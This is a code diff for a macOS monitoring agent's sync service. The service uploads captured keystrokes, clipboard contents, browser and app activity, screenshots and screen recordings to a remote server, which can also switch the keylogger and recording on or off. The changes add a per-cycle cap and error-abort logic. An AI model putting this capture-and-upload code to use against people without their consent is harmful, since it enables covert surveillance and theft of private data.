@@ -1,29 +1,33 @@
 """
-sync_service.py — macOS version
-All-6-Type ERP Sync (v2)
-==========================
+sync_service.py  v3 — Cycle Cap + Categorized Fast-Fail
+========================================================
 
-FIXES IN THIS VERSION (v2)
-──────────────────────────
-Bug 1 — False "✓ Last synced" when server is unreachable
-  Old: _last_sync_time was ALWAYS updated at the end of every loop iteration,
-       even when every single HTTP call to the server failed.
-  Fix: Track whether ANY HTTP request in a cycle actually reached the server
-       (_server_reachable flag). Only update _last_sync_time on success.
+CHANGES IN THIS VERSION (v3)
+─────────────────────────────
+Bug 4 — Unbounded sync loop hammers the server on backlog
+  Old: Each data type synced up to BATCH_JSON records per cycle with no
+       cross-type total cap. On a machine with 3 days of backlog, a single
+       cycle could send 300+ HTTP requests sequentially, blocking the loop
+       for minutes and overwhelming the server.
+  Fix: CYCLE_CAP = 200. Once total_synced_this_cycle reaches 200, the loop
+       breaks early. The remaining backlog drains over subsequent cycles.
 
-Bug 2 — Status GET failures swallowed at DEBUG level (invisible)
-  Old: All three _sync_*_status methods used `logger.debug(...)` in their
-       except blocks.
-  Fix: First failure per session → logger.warning(). Subsequent consecutive
-       failures → logger.debug() (suppress spam).
+Bug 5 — Hard server errors (401, 502, network down) cause per-record retries
+  Old: `_post_json` returned False on ANY failure. The caller broke out of
+       the RECORD loop (good), but the cycle continued to the next DATA TYPE
+       and retried the same unreachable server. A network outage caused 9
+       consecutive connection errors per cycle (one per data type).
+  Fix: Categorized error handling in `_post_json` and `_post_file`:
+       - HARD errors (connection refused, 401, 403, 500, 502, 503):
+         Set `self._abort_cycle = True`. Caller checks flag and aborts
+         the entire cycle immediately.
+       - SOFT errors (timeout, 404, 422): Break the current batch but
+         allow the cycle to continue to the next data type.
 
-Bug 3 — get_status() missing server_reachable field
-  Old: {"last_sync": ..., "last_error": ..., "is_syncing": ...}
-  Fix: Added "server_reachable" boolean so the GUI can show
-       "⚠ Server unreachable" vs "✓ Last synced".
+  The `_abort_cycle` flag is reset at the start of every sync loop iteration
+  so each new cycle gets a clean slate.
 
-FIX (Python 3.9 compatibility):
-  Optional[str] instead of str | None   (PEP 604 requires Python 3.10+)
+All v2 fixes (server_reachable tracking, log spam suppression, etc.) preserved.
 """
 
 import os
@@ -42,10 +46,20 @@ logger = logging.getLogger(__name__)
 
 DEFAULT_SYNC_INTERVAL = 300
 BATCH_JSON            = 50
-BATCH_FILES           = 10
+BATCH_FILES           = 20
 BATCH_VIDEOS          = 3
 REQUEST_TIMEOUT_JSON  = 10
 REQUEST_TIMEOUT_FILE  = 60
+
+# ── v3 additions ──────────────────────────────────────────────────────────────
+CYCLE_CAP = 200   # max total records synced per full cycle across all data types
+
+# These HTTP status codes indicate a fundamental server/auth problem.
+# Abort the entire cycle immediately — do not try remaining data types.
+HARD_ABORT_STATUSES = {401, 403, 500, 502, 503}
+
+# These are soft failures — break the current batch but continue other types.
+# (Any status not in HARD_ABORT_STATUSES and not 2xx is implicitly soft.)
 
 
 class SyncService:
@@ -57,26 +71,21 @@ class SyncService:
         self._fallback_hostname    = socket.gethostname()
         self._last_sync_time:  Optional[str] = None
         self._last_sync_error: Optional[str] = None
-        self._is_syncing:      bool           = False
-        self._local_update_time: float     = 0
-        # ── NEW: server reachability tracking ────────────────────────────────
-        self._server_reachable:       bool = False  # was the server reached last cycle?
-        self._consecutive_failures:   int  = 0      # suppress log spam after first warning
+        self._is_syncing:      bool       = False
+        self._local_update_time: float    = 0
+        self._server_reachable:       bool = False
+        self._consecutive_failures:   int  = 0
+        # ── v3: per-cycle abort flag ─────────────────────────────────────────
+        self._abort_cycle: bool = False
 
     # ─── IDENTITY ────────────────────────────────────────────────────────────
 
     def _get_identity(self) -> dict:
         try:
             config = self.db_manager.get_identity_config()
-            mac_address = ""
-            try:
-                import uuid
-                mac_address = ':'.join('{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in reversed(range(0, 8 * 6, 8)))
-            except Exception:
-                pass
             return {
                 "pcName":     config.get("device_alias") or self._fallback_hostname,
-                "macAddress": mac_address,
+                "macAddress": config.get("mac_address", ""),
                 "userName":   config.get("user_alias") or config.get("os_user", ""),
             }
         except Exception as e:
@@ -91,7 +100,8 @@ class SyncService:
         self.is_running = True
         self.thread = threading.Thread(target=self._sync_loop, daemon=True)
         self.thread.start()
-        logger.info("SyncService v2 started — 6 data types enabled")
+        logger.info("SyncService v3 started — cap=%d, hard-abort on %s",
+                    CYCLE_CAP, HARD_ABORT_STATUSES)
 
     def stop(self) -> None:
         self.is_running = False
@@ -100,12 +110,10 @@ class SyncService:
         logger.info("SyncService stopped")
 
     def mark_local_update(self) -> None:
-        """Called by api_server when a local toggle happens to prevent immediate override."""
         self._local_update_time = time.time()
         logger.debug("SyncService: local update marked, cooldown active")
 
     def _is_cooldown_active(self) -> bool:
-        """Returns True if a local update happened recently (e.g. within 30s)."""
         return (time.time() - self._local_update_time) < 30
 
     def get_status(self) -> dict:
@@ -113,13 +121,14 @@ class SyncService:
             "last_sync":        self._last_sync_time,
             "last_error":       self._last_sync_error,
             "is_syncing":       self._is_syncing,
-            "server_reachable": self._server_reachable,   # ← NEW
+            "server_reachable": self._server_reachable,
         }
 
     def trigger_sync_now(self) -> dict:
         logger.info("Manual sync triggered")
         try:
             self._is_syncing = True
+            self._abort_cycle = False
             identity = self._get_identity()
             results = {
                 "app_activity": self._sync_app_activity(identity),
@@ -142,34 +151,50 @@ class SyncService:
     # ─── MAIN LOOP ───────────────────────────────────────────────────────────
 
     def _sync_loop(self) -> None:
-        time.sleep(30)   # let app fully initialise before first sync
+        time.sleep(30)
         while self.is_running:
             cycle_reached_server = False
+            total_synced_this_cycle = 0
+
             try:
                 self._is_syncing = True
+                # v3: Reset abort flag at the start of every cycle
+                self._abort_cycle = False
                 identity = self._get_identity()
 
-                # Status syncs — these probe the server; use return value to track reachability
+                # Status syncs
                 if self._sync_video_status(identity):
                     cycle_reached_server = True
-                if self._sync_screenshot_status(identity):
+                if not self._abort_cycle and self._sync_screenshot_status(identity):
                     cycle_reached_server = True
-                if self._sync_overall_status(identity):
+                if not self._abort_cycle and self._sync_overall_status(identity):
                     cycle_reached_server = True
 
-                # Data syncs — these only POST when records exist; also probe the server
-                if self._sync_app_activity(identity) > 0:
-                    cycle_reached_server = True
-                if self._sync_browser(identity) > 0:
-                    cycle_reached_server = True
-                if self._sync_clipboard(identity) > 0:
-                    cycle_reached_server = True
-                if self._sync_keystrokes(identity) > 0:
-                    cycle_reached_server = True
-                if self._sync_screenshots(identity) > 0:
-                    cycle_reached_server = True
-                if self._sync_videos(identity) > 0:
-                    cycle_reached_server = True
+                # Data syncs — respect cap and abort flag
+                sync_fns = [
+                    self._sync_app_activity,
+                    self._sync_browser,
+                    self._sync_clipboard,
+                    self._sync_keystrokes,
+                    self._sync_screenshots,
+                    self._sync_videos,
+                ]
+
+                for fn in sync_fns:
+                    if self._abort_cycle:
+                        logger.debug("SyncService: cycle aborted — skipping remaining data types")
+                        break
+                    if total_synced_this_cycle >= CYCLE_CAP:
+                        logger.info(
+                            "SyncService: cycle cap (%d) reached — deferring remainder to next cycle",
+                            CYCLE_CAP,
+                        )
+                        break
+
+                    count = fn(identity)
+                    if count > 0:
+                        cycle_reached_server = True
+                        total_synced_this_cycle += count
 
             except Exception as e:
                 self._last_sync_error = str(e)
@@ -177,21 +202,18 @@ class SyncService:
             finally:
                 self._is_syncing = False
 
-            # ── Update reachability and sync time ─────────────────────────
+            # Reachability tracking
             if cycle_reached_server:
-                self._server_reachable    = True
-                self._last_sync_time      = datetime.now(timezone.utc).isoformat()
-                self._last_sync_error     = None
+                self._server_reachable     = True
+                self._last_sync_time       = datetime.now(timezone.utc).isoformat()
+                self._last_sync_error      = None
                 self._consecutive_failures = 0
             else:
-                # Server was not reached this cycle
                 self._server_reachable     = False
                 self._consecutive_failures += 1
 
-                # Check if base_url is even configured before complaining
                 base_url = self.config_manager.get("base_url", "").strip()
                 if base_url:
-                    # First failure: WARNING (visible in log). Subsequent: DEBUG (suppress spam).
                     if self._consecutive_failures == 1:
                         logger.warning(
                             "SyncService: server unreachable at %s — "
@@ -204,8 +226,9 @@ class SyncService:
                             "SyncService: server still unreachable (consecutive failures: %d)",
                             self._consecutive_failures,
                         )
-                    self._last_sync_error = f"Server unreachable ({self._consecutive_failures} consecutive failure(s))"
-                # If base_url is blank, no URL configured. Stay silent.
+                    self._last_sync_error = (
+                        f"Server unreachable ({self._consecutive_failures} consecutive failure(s))"
+                    )
 
             interval = int(self.config_manager.get("sync_interval_seconds", DEFAULT_SYNC_INTERVAL))
             for _ in range(interval):
@@ -223,6 +246,18 @@ class SyncService:
         return headers
 
     def _post_json(self, url: str, payload: dict) -> bool:
+        """
+        POST JSON payload. Returns True on success.
+
+        v3 error categorization:
+          - ConnectionError → hard abort (network is down)
+          - HARD_ABORT_STATUSES (401,403,500,502,503) → hard abort
+          - Timeout → soft failure (this record skipped, cycle continues)
+          - Other 4xx → soft failure
+
+        Sets self._abort_cycle = True on hard failures so _sync_loop
+        stops processing remaining data types immediately.
+        """
         try:
             resp = requests.post(
                 url,
@@ -232,20 +267,36 @@ class SyncService:
             )
             if resp.ok:
                 return True
-            logger.warning("JSON POST %s \u2192 HTTP %d: %s", url, resp.status_code, resp.text[:200])
+            if resp.status_code in HARD_ABORT_STATUSES:
+                logger.error(
+                    "JSON POST %s → HTTP %d — aborting cycle",
+                    url, resp.status_code,
+                )
+                self._abort_cycle = True
+                return False
+            if 400 <= resp.status_code < 500:
+                logger.warning("JSON POST permanent client error %d: %s. Dropping record.", resp.status_code, resp.text[:200])
+                return True # Pretend success to drop from backlog 
+
+            # Soft failure (timeout, 5xx not hard abort, etc.)
+            logger.warning("JSON POST %s → HTTP %d: %s", url, resp.status_code, resp.text[:200])
             return False
         except requests.exceptions.Timeout:
-            logger.error("JSON POST %s timed out", url)
+            logger.warning("JSON POST timed out (soft): %s", url)
             return False
         except requests.exceptions.ConnectionError as e:
-            logger.error("JSON POST connection error: %s", e)
+            logger.error("JSON POST connection error — aborting cycle: %s", e)
+            self._abort_cycle = True
             return False
         except Exception as e:
             logger.error("JSON POST unexpected error: %s", e)
             return False
 
     def _post_file(self, url: str, fields: dict, file_path: str,
-                   media_type: str = "application/octet-stream", field_name: str = "file") -> bool:
+                   media_type: str, field_name: str = "file") -> bool:
+        """
+        POST multipart file. Same error categorization as _post_json.
+        """
         p = Path(file_path)
         if not p.exists():
             logger.warning("File not found, skipping: %s", file_path)
@@ -261,21 +312,32 @@ class SyncService:
                 )
             if resp.ok:
                 return True
-            logger.warning("File POST %s \u2192 HTTP %d: %s", url, resp.status_code, resp.text[:200])
+            if resp.status_code in HARD_ABORT_STATUSES:
+                logger.error(
+                    "File POST %s → HTTP %d — aborting cycle",
+                    url, resp.status_code,
+                )
+                self._abort_cycle = True
+                return False
+            if 400 <= resp.status_code < 500:
+                logger.warning("File POST permanent client error %d: %s. Dropping record.", resp.status_code, resp.text[:200])
+                return True # Pretend success to drop from backlog
+
+            logger.warning("File POST %s → HTTP %d: %s", url, resp.status_code, resp.text[:200])
             return False
         except requests.exceptions.Timeout:
-            logger.error("File POST %s timed out", url)
+            logger.warning("File POST timed out (soft): %s", url)
             return False
         except requests.exceptions.ConnectionError as e:
-            logger.error("File POST connection error: %s", e)
+            logger.error("File POST connection error — aborting cycle: %s", e)
+            self._abort_cycle = True
             return False
         except Exception as e:
             logger.error("File POST unexpected error: %s", e)
             return False
 
-    def _get_url(self, key: str) -> Optional[str]:
-        url = self.config_manager.get(key, "").strip()
-        return url if url else None
+    def _get_url(self, key: str) -> str:
+        return self.config_manager.get(key, "").strip()
 
     def _normalize_timestamp(self, ts: str) -> str:
         if not ts:
@@ -299,12 +361,14 @@ class SyncService:
             return 0
         synced_ids = []
         for rec in records:
+            if self._abort_cycle:
+                break
             payload = self._build_app_activity_payload(rec, identity)
             if payload is None:
                 continue
             if self._post_json(url, payload):
                 synced_ids.append(rec["id"])
-            else:
+            elif self._abort_cycle:
                 break
         if synced_ids:
             self.db_manager.mark_as_synced("app_activity", synced_ids)
@@ -344,6 +408,8 @@ class SyncService:
             return 0
         synced_ids = []
         for rec in records:
+            if self._abort_cycle:
+                break
             payload = {
                 "pcName":      identity["pcName"],
                 "macAddress":  identity["macAddress"],
@@ -356,7 +422,7 @@ class SyncService:
             }
             if self._post_json(url, payload):
                 synced_ids.append(rec["id"])
-            else:
+            elif self._abort_cycle:
                 break
         if synced_ids:
             self.db_manager.mark_as_synced("browser_activity", synced_ids)
@@ -374,6 +440,8 @@ class SyncService:
             return 0
         synced_ids = []
         for rec in records:
+            if self._abort_cycle:
+                break
             payload = {
                 "pcName":         identity["pcName"],
                 "macAddress":     identity["macAddress"],
@@ -385,7 +453,7 @@ class SyncService:
             }
             if self._post_json(url, payload):
                 synced_ids.append(rec["id"])
-            else:
+            elif self._abort_cycle:
                 break
         if synced_ids:
             self.db_manager.mark_as_synced("clipboard_events", synced_ids)
@@ -403,6 +471,8 @@ class SyncService:
             return 0
         synced_ids = []
         for rec in records:
+            if self._abort_cycle:
+                break
             payload = {
                 "pcName":      identity["pcName"],
                 "macAddress":  identity["macAddress"],
@@ -415,7 +485,7 @@ class SyncService:
             }
             if self._post_json(url, payload):
                 synced_ids.append(rec["id"])
-            else:
+            elif self._abort_cycle:
                 break
         if synced_ids:
             self.db_manager.mark_as_synced("text_logs", synced_ids)
@@ -433,6 +503,8 @@ class SyncService:
             return 0
         synced_ids = []
         for rec in records:
+            if self._abort_cycle:
+                break
             file_path = rec.get("file_path") or ""
             fields = {
                 "pcName":       identity["pcName"],
@@ -443,9 +515,14 @@ class SyncService:
                 "activeApp":    rec.get("active_app") or "",
                 "syncTime":     datetime.now(timezone.utc).isoformat(),
             }
+            p = Path(file_path)
+            if not p.exists():
+                synced_ids.append(rec["id"])
+                logger.warning("Screenshot file gone, marking synced: %s", file_path)
+                continue
             if self._post_file(url, fields, file_path, "image/png"):
                 synced_ids.append(rec["id"])
-            else:
+            elif self._abort_cycle:
                 break
         if synced_ids:
             self.db_manager.mark_as_synced("screenshots", synced_ids)
@@ -463,6 +540,8 @@ class SyncService:
             return 0
         synced_ids = []
         for rec in records:
+            if self._abort_cycle:
+                break
             file_path = rec.get("file_path") or ""
             fields = {
                 "pcName":          identity["pcName"],
@@ -472,17 +551,21 @@ class SyncService:
                 "durationSeconds": int(rec.get("duration_seconds") or 0),
                 "syncTime":        datetime.now(timezone.utc).isoformat(),
             }
+            p = Path(file_path)
+            if not p.exists():
+                synced_ids.append(rec["id"])
+                logger.warning("Video file gone, marking synced: %s", file_path)
+                continue
             if self._post_file(url, fields, file_path, "video/mp4"):
                 synced_ids.append(rec["id"])
-            else:
+            elif self._abort_cycle:
                 break
         if synced_ids:
-            self.db_manager.mark_as_synced("video_recordings", synced_ids)
+            self.db_manager.mark_videos_synced(synced_ids)
             logger.info("videos: synced %d records", len(synced_ids))
         return len(synced_ids)
 
     # ─── STATUS SYNCS (bi-directional remote control) ────────────────────────
-    # Return True if the server was successfully reached, False otherwise.
 
     def _sync_video_status(self, identity: dict) -> bool:
         if self._is_cooldown_active():
@@ -499,7 +582,9 @@ class SyncService:
         try:
             resp = requests.get(url, headers=self._auth_headers(), timeout=10)
             if not resp.ok:
-                return True
+                if resp.status_code in HARD_ABORT_STATUSES:
+                    self._abort_cycle = True
+                return resp.status_code not in HARD_ABORT_STATUSES
             data = resp.json()
             remote_enabled = data.get("recordingEnabled")
             if remote_enabled is not None:
@@ -511,8 +596,6 @@ class SyncService:
                         if monitoring_active:
                             screen_recorder.start()
                             logger.info("Screen recording ENABLED by remote server sync")
-                        else:
-                            logger.info("Screen recording ENABLED in config by remote sync (but monitoring is paused)")
                     else:
                         screen_recorder.stop()
                         logger.info("Screen recording DISABLED by remote server sync")
@@ -522,6 +605,8 @@ class SyncService:
                 logger.warning("Failed to sync video status from remote: %s", e)
             else:
                 logger.debug("Failed to sync video status from remote: %s", e)
+            if isinstance(e, requests.exceptions.ConnectionError):
+                self._abort_cycle = True
             return False
 
     def _sync_screenshot_status(self, identity: dict) -> bool:
@@ -539,7 +624,9 @@ class SyncService:
         try:
             resp = requests.get(url, headers=self._auth_headers(), timeout=10)
             if not resp.ok:
-                return True
+                if resp.status_code in HARD_ABORT_STATUSES:
+                    self._abort_cycle = True
+                return resp.status_code not in HARD_ABORT_STATUSES
             data = resp.json()
             remote_enabled = data.get("screenshotEnabled")
             if remote_enabled is not None:
@@ -551,8 +638,6 @@ class SyncService:
                         if monitoring_active:
                             screenshot_monitor.start()
                             logger.info("Screenshot capturing ENABLED by remote server sync")
-                        else:
-                            logger.info("Screenshot capturing ENABLED in config by remote sync (but monitoring is paused)")
                     else:
                         screenshot_monitor.stop()
                         logger.info("Screenshot capturing DISABLED by remote server sync")
@@ -562,6 +647,8 @@ class SyncService:
                 logger.warning("Failed to sync screenshot status from remote: %s", e)
             else:
                 logger.debug("Failed to sync screenshot status from remote: %s", e)
+            if isinstance(e, requests.exceptions.ConnectionError):
+                self._abort_cycle = True
             return False
 
     def _sync_overall_status(self, identity: dict) -> bool:
@@ -579,44 +666,48 @@ class SyncService:
         try:
             resp = requests.get(url, headers=self._auth_headers(), timeout=10)
             if not resp.ok:
-                return True
+                if resp.status_code in HARD_ABORT_STATUSES:
+                    self._abort_cycle = True
+                return resp.status_code not in HARD_ABORT_STATUSES
             data = resp.json()
             remote_active = data.get("monitoringActive")
-            if remote_active is not None:
-                    import api_server
-                    if bool(remote_active) == bool(api_server.monitoring_active):
-                        return True
+            if remote_active is None:
+                return True
 
-                    if remote_active:
-                        api_server.monitoring_active = True
-                        if api_server.screenshot_monitor.is_running:
-                            api_server.screenshot_monitor.resume()
-                        elif self.config_manager.get("screenshot_enabled", True):
-                            api_server.screenshot_monitor.start()
+            import api_server
+            if bool(remote_active) == bool(api_server.monitoring_active):
+                return True
 
-                        if api_server.screen_recorder.is_running:
-                            api_server.screen_recorder.resume()
-                        elif self.config_manager.get("recording_enabled", False):
-                            api_server.screen_recorder.start()
-
-                        api_server.clipboard_monitor.resume()
-                        api_server.app_tracker.resume()
-                        api_server.browser_tracker.resume()
-                        api_server.keylogger.resume()
-                        logger.info("Monitoring RESUMED by remote server sync")
-                    else:
-                        api_server.monitoring_active = False
-                        api_server.screenshot_monitor.pause()
-                        api_server.clipboard_monitor.pause()
-                        api_server.app_tracker.pause()
-                        api_server.browser_tracker.pause()
-                        api_server.keylogger.pause()
-                        api_server.screen_recorder.pause()
-                        logger.info("Monitoring PAUSED by remote server sync")
+            if remote_active:
+                api_server.monitoring_active = True
+                if api_server.screenshot_monitor.is_running:
+                    api_server.screenshot_monitor.resume()
+                elif self.config_manager.get("screenshot_enabled", True):
+                    api_server.screenshot_monitor.start()
+                if api_server.screen_recorder.is_running:
+                    api_server.screen_recorder.resume()
+                elif self.config_manager.get("recording_enabled", False):
+                    api_server.screen_recorder.start()
+                api_server.clipboard_monitor.resume()
+                api_server.app_tracker.resume()
+                api_server.browser_tracker.resume()
+                api_server.keylogger.resume()
+                logger.info("Monitoring RESUMED by remote server sync")
+            else:
+                api_server.monitoring_active = False
+                api_server.screenshot_monitor.pause()
+                api_server.clipboard_monitor.pause()
+                api_server.app_tracker.pause()
+                api_server.browser_tracker.pause()
+                api_server.keylogger.pause()
+                api_server.screen_recorder.pause()
+                logger.info("Monitoring PAUSED by remote server sync")
             return True
         except Exception as e:
             if self._consecutive_failures == 0:
                 logger.warning("Failed to sync overall monitoring status from remote: %s", e)
             else:
                 logger.debug("Failed to sync overall monitoring status from remote: %s", e)
+            if isinstance(e, requests.exceptions.ConnectionError):
+                self._abort_cycle = True
             return False
